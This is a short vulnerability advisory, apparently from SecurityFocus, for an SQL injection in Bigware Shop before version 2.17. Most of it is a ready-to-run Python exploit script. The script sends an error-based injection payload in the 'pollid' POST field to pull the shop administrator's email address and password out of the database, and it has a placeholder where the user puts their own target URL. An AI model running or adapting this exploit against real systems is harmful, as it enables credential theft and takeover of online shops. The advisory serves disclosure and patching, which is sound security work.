source: https://www.securityfocus.com/bid/53810/info

Bigware Shop is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

A successful exploit will allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

Bigware Shop versions prior to 2.17 are vulnerable. 

#!/usr/bin/python
# -*- coding: utf-8 -*-
import httplib2
import urllib
import sys

# insert your target link here (with trailing slash)
url = "http://www.example.com/"
h = httplib2.Http()

# send sql injection
headerdata = {'Content-type': 'application/x-www-form-urlencoded'}
sqli = '2 AND (SELECT 1 FROM(SELECT COUNT(*), CONCAT((SELECT former_email_address FROM former where former_groups_id like 1 LIMIT 0,1), CHAR(58), (SELECT
 former_password FROM former where former_groups_id like 1 LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)'
postdata = {  'voteid' : '2', \
    'pollid' : sqli, \
    'x' : '1', \
    'y' : '1', \
    'forwarder' : 'http%3a%2f%2fdemoshop.bigware.org%2fmain_bigware_53.php%3fop%3dresults%26pollid%3d2'}
response, content = h.request(url + "main_bigware_54.php", "POST", headers=headerdata, body=urllib.urlencode(postdata))
print content, "\n", "\n"
print "If there is an error stating the duplicate admin entry, your shop is vulnerable."